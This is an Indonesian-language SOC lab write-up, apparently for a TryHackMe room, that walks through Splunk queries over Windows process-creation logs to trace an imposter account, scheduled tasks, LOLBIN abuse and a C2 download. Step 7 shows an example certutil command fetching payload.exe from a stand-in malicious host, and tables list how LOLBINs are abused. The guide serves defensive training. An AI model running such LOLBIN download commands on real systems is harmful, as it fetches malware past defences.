# 🔍 Splunk Log Analysis — Investigasi Host yang Dikompromasi

> **Seri Lab:** Blue Team SOC Lab  
> **Platform:** [TryHackMe — Room: Benign](https://tryhackme.com)  
> **YouTube:** [▶️ Tonton Tutorial di YouTube](https://youtu.be/cebje-CSlqI?si=zqmaC6kSa07OVhOt)  
> **Tingkat Kesulitan:** `Menengah` | **Tools:** `Splunk` | **Kategori:** `Log Analysis, Threat Hunting`

---

## 📋 Deskripsi

Lab ini adalah investigasi **host yang diduga dikompromasi** menggunakan data log Windows di Splunk. Kita menganalisis **Event ID 4688** (Process Creation) untuk menemukan aktivitas mencurigakan — mulai dari akun palsu (*imposter account*), penggunaan **LOLBIN**, hingga download payload malware dari server C2.

> 💡 **LOLBIN** (*Living Off the Land Binaries*) adalah tool bawaan Windows yang disalahgunakan attacker untuk menghindari deteksi antivirus — contoh: `certutil.exe`, `bitsadmin.exe`, `mshta.exe`.

---

## 🎬 Video Tutorial

[![Splunk Log Analysis - Compromised Host Investigation](https://img.youtube.com/vi/cebje-CSlqI/maxresdefault.jpg)](https://youtu.be/cebje-CSlqI?si=zqmaC6kSa07OVhOt)

> 📺 **[Tonton di YouTube → Splunk Log Analysis — Compromised Host Investigation](https://youtu.be/cebje-CSlqI?si=zqmaC6kSa07OVhOt)**

---

## 🎯 Tujuan Investigasi

Di room ini kita bertugas sebagai **SOC Analyst** yang harus:

- Menemukan **akun palsu** yang menyamar di antara user HR yang sah
- Mengidentifikasi **user HR** yang menjalankan Scheduled Task
- Menemukan **LOLBIN** yang digunakan untuk download payload
- Mengungkap **URL/domain C2** (*Command & Control*) yang digunakan attacker
- Menemukan **nama file malware** yang didownload

---

## 🧠 Pola Serangan (Attack Chain)

Memahami urutan serangan sangat penting sebelum mulai investigasi:

```
[1] User login ke sistem
        ↓
[2] Buat/jalankan Scheduled Task
        ↓
[3] Gunakan LOLBIN (certutil, bitsadmin, dll)
        ↓
[4] Download payload dari server C2
        ↓
[5] Eksekusi malware
        ↓
[6] Koneksi balik ke C2 (Reverse Shell / Beacon)
```

---

## ⚙️ Persiapan Awal

### Akses Splunk

Buka browser dan akses Splunk Web Interface:

```
http://10.48.137.148:8000
```

Login dengan kredensial TryHackMe default:

```
Username : admin
Password : password
```

### Index & Event yang Digunakan

| Parameter | Nilai |
|-----------|-------|
| **Index** | `win_eventlogs` |
| **Event ID** | `4688` (Process Creation) |
| **Periode** | Maret 2022 |

### Query Dasar

Semua investigasi dimulai dari query ini:

```splunk
index=win_eventlogs EventCode=4688
```

---

## 🔍 Langkah-Langkah Investigasi

### Langkah 1 — Hitung Total Log Bulan Maret 2022

Sebelum investigasi, kenali dulu skala datanya:

```splunk
index=win_eventlogs EventCode=4688
earliest=03/01/2022:00:00:00
latest=03/31/2022:23:59:59
| stats count
```

> 👉 Output berupa angka total log. Catat sebagai referensi awal.

---

### Langkah 2 — Temukan Akun Palsu (Imposter Account)

Lihat semua akun yang aktif menjalankan proses, lalu bandingkan dengan daftar user yang seharusnya ada:

```splunk
index=win_eventlogs EventCode=4688
| stats count by Account_Name
```

**Yang dicari:**

| Tanda Kecurigaan | Contoh |
|-----------------|--------|
| Typo di nama user | `adm1n`, `adminn`, `jame$` |
| Nama tidak ada di direktori | User tidak dikenal |
| Aktivitas volume tinggi yang tidak wajar | Count jauh di atas rata-rata |

> 💡 **Tips:** Bandingkan hasil dengan daftar resmi karyawan yang diberikan di soal room TryHackMe.

---

### Langkah 3 — Cari User HR yang Jalankan Scheduled Task

Attacker sering menggunakan Scheduled Task untuk persistensi (*agar tetap aktif setelah reboot*):

```splunk
index=win_eventlogs EventCode=4688
(schtasks OR taskeng OR at.exe)
```

**User HR yang sah di room ini:**

```
✅ Haroon
✅ Chris
✅ Diana
```

> 👉 Jika ada user di luar daftar ini yang menjalankan `schtasks`, itu **mencurigakan**.

---

### Langkah 4 — Temukan User HR yang Download Payload via LOLBIN

Cari penggunaan tool bawaan Windows yang sering disalahgunakan untuk download file:

```splunk
index=win_eventlogs EventCode=4688
(certutil OR bitsadmin OR powershell OR mshta OR curl)
```

**Field yang perlu diperhatikan:**

| Field | Keterangan |
|-------|------------|
| `Account_Name` | Siapa yang menjalankan? |
| `CommandLine` | Argumen lengkap — **paling penting!** |
| `New_Process_Name` | Nama proses/tool yang dipakai |

---

### Langkah 5 — Identifikasi LOLBIN yang Digunakan

Dari hasil query sebelumnya, lihat field:

```
New_Process_Name
```

**LOLBIN yang umum digunakan attacker:**

| LOLBIN | Penyalahgunaan Umum |
|--------|---------------------|
| `certutil.exe` | Download file, decode base64 |
| `bitsadmin.exe` | Download file via BITS service |
| `powershell.exe` | Download & eksekusi script |
| `mshta.exe` | Eksekusi HTA/VBScript |
| `wscript.exe` | Eksekusi script VBS/JS |
| `regsvr32.exe` | Load DLL dari remote |

---

### Langkah 6 — Temukan Tanggal Eksekusi

Tambahkan tabel untuk melihat waktu eksekusi dengan jelas:

```splunk
index=win_eventlogs EventCode=4688
(certutil OR bitsadmin OR powershell OR mshta)
| table _time, Account_Name, New_Process_Name, CommandLine
```

> 👉 Ambil tanggal dalam format `YYYY-MM-DD` dari kolom `_time`.

---

### Langkah 7 — Temukan Domain/URL C2

Lihat isi `CommandLine` secara detail. Attacker biasanya menyisipkan URL download di sana:

```splunk
index=win_eventlogs EventCode=4688
(http OR https)
| table _time, Account_Name, CommandLine
```

**Contoh command yang mencurigakan:**

```
certutil.exe -urlcache -split -f http://malicious-site.com/payload.exe
```

> 👉 Ambil domain lengkapnya: `malicious-site.com`

---

### Langkah 8 — Temukan Nama File Malware

Masih dari analisis `CommandLine`, cari nama file yang didownload:

```splunk
index=win_eventlogs EventCode=4688
(http OR https)
| table CommandLine
```

> 👉 File biasanya berekstensi `.exe`, `.ps1`, `.bat`, atau `.dll`.

---

### Langkah 9 — Cari Flag TryHackMe

Flag tersembunyi di dalam log — bisa di isi command, nama file, atau argumen:

```splunk
index=win_eventlogs THM{
```

> 👉 Format flag: `THM{...}`

---

### Langkah 10 — Rekonstruksi URL Lengkap

Dari hasil investigasi, rekonstruksi URL lengkap yang digunakan attacker:

```splunk
index=win_eventlogs EventCode=4688
(http OR https)
| rex field=CommandLine "(?P<url>https?://[^\s]+)"
| table _time, Account_Name, url
```

---

## 📊 Ringkasan Temuan (Template)

Gunakan tabel ini untuk mencatat hasil investigasi kamu:

| No | Pertanyaan | Temuan |
|----|------------|--------|
| 1 | Total log Maret 2022 | `...` |
| 2 | Akun palsu (imposter) | `...` |
| 3 | User HR yang jalankan Scheduled Task | `...` |
| 4 | User HR yang download payload | `...` |
| 5 | LOLBIN yang digunakan | `...` |
| 6 | Tanggal eksekusi | `...` |
| 7 | Domain C2 | `...` |
| 8 | Nama file malware | `...` |
| 9 | Flag THM | `THM{...}` |
| 10 | URL lengkap | `...` |

---

## 🔥 Strategi Investigasi

### 1. Identifikasi Anomali
- User tidak dikenal di antara user HR yang sah
- Proses sistem yang dijalankan oleh user biasa
- Command line yang sangat panjang atau mengandung URL

### 2. Fokus pada CommandLine
Field `CommandLine` adalah **yang paling informatif** dalam investigasi ini — hampir semua jawaban ada di sana.

### 3. Urutan Query yang Efisien

```
Mulai broad → lalu narrowing down

1. Lihat semua user aktif
2. Filter ke user yang mencurigakan
3. Lihat proses yang dijalankan user tersebut
4. Baca CommandLine-nya secara detail
```

---

## 📌 Referensi Field Event ID 4688

| Field | Keterangan |
|-------|------------|
| `Account_Name` | User yang menjalankan proses |
| `New_Process_Name` | Path lengkap proses baru |
| `Process_Command_Line` / `CommandLine` | Argumen yang digunakan |
| `Creator_Process_Name` | Proses induk yang memanggil |
| `_time` | Waktu kejadian |

---

## 📚 Referensi

- [TryHackMe — Room Benign](https://tryhackme.com/room/benign)
- [LOLBAS Project — Living Off The Land Binaries](https://lolbas-project.github.io/)
- [Windows Event ID 4688 Reference](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4688)
- [Splunk Search Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)

---

*📺 Ikuti tutorialnya di [YouTube](https://youtu.be/cebje-CSlqI?si=zqmaC6kSa07OVhOt) | ⭐ Star repo ini jika membantu!*
